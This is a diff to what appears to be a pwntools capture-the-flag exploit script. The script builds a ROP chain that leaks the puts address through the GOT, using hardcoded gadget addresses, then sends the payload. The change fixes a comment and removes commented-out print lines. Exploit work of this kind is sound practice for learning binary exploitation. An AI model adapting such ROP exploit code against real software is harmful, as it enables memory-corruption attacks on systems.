@@ -27,7 +27,7 @@ rop.call("puts", [elf.got.puts])
 
 #Due to invalid value in rsi the crash was occuring in printf while re-executing the main(), these instructions are just to avoid that crash
 rop.raw(0x0000000000401ca1) #pop rsi ; pop r15 ; ret (address in PIE disabled binary)
-rop.raw(0x0000000000404018) #value that will be pop'ed in rsi, this is some random value found in RODATA section to satisfy the printf criteria
+rop.raw(0x0000000000404018) #value that will be pop'ed in rsi, this is some random value found in GOT section to satisfy the printf criteria, take the static value from puts@glibc in puts@plt
 rop.raw(0x00000000000000000) #bogus value that will be pop'ed in r15
 
 rop.raw(0x000000000040101a) #for stack alignment
@@ -41,10 +41,6 @@ p.recvuntil("\n###\n")
 p.sendline(payload)
 p.recvuntil("Exiting!\n")
 puts = p.recvline()
-
-#print(p.recvline())
-#print(p.recvline())
-#print(p.recvline())
 p.recvuntil("\n###\n")
 
 puts = puts.rstrip()
